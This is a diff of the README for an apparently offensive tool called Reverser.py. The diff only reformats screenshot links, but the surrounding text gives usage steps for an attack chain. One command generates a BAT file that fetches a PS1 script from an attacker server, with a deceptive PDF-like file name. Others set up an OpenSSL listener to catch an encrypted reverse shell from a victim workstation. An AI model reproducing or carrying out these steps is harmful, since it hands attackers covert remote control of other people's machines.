@@ -44,9 +44,8 @@ Creating a BAT file with the tool and transferring it to the listener's director
 ```bash
 python3 Reverser.py -ip <Your_IP> -port <Your_PORT> -type bat -server https://<Your_Listener_Server_IP_For_Downloadin_PS1/welcome.pdf.ine.co.il.ps1>
 ```
-```
 ![image](https://github.com/user-attachments/assets/350a0105-c8a3-43f5-8e67-fddb34cf84f8)
-```
+
 
 Opening a listener with the OpenSSL server to receive the Reverse shell connection, 
 and opening a listener with our server to handle the initial connection for downloading the PS1 file from the BAT file:
@@ -56,31 +55,26 @@ openssl s_server -accept <Your_PORT> -cert reception.pem -key reception.key -qui
 ```bash
 python3 listener.py -https_port <Your_Listener_Server_PORT>
 ```
-```
 ![image](https://github.com/user-attachments/assets/b64a4bf1-e801-4a3e-8a0b-eaa1acbd9ff8)
-```
+
 
 Running the BAT file on the workstation, the file connects to our listener server over encrypted traffic:
-```
 ![image](https://github.com/user-attachments/assets/a2b977f8-455c-42a8-9ec9-1e4d66905035)
-```
+
 
 Receiving a response from the listener server and establishing a Reverse shell from the workstation:
-```
 ![image](https://github.com/user-attachments/assets/dee0bf16-68f4-4059-9bdf-3d28e859e4c5)
-```
+
 
 The encrypted network traffic:
-```
 ![image](https://github.com/user-attachments/assets/7fa8673f-0d4c-40e5-9449-ef746b6b203f)
-```
+
 
 And here is an example for those who want to create an encrypted listener server. 
 The BAT file will connect to the server to download the PS1 file, and you can observe the connection to the server. 
 The Reverse shell operation will then proceed in an encrypted manner:
-```
 ![image](https://github.com/user-attachments/assets/77b78ae6-fc92-4fa9-93fa-ab43a9bc5b27)
-```
+
 
 
 
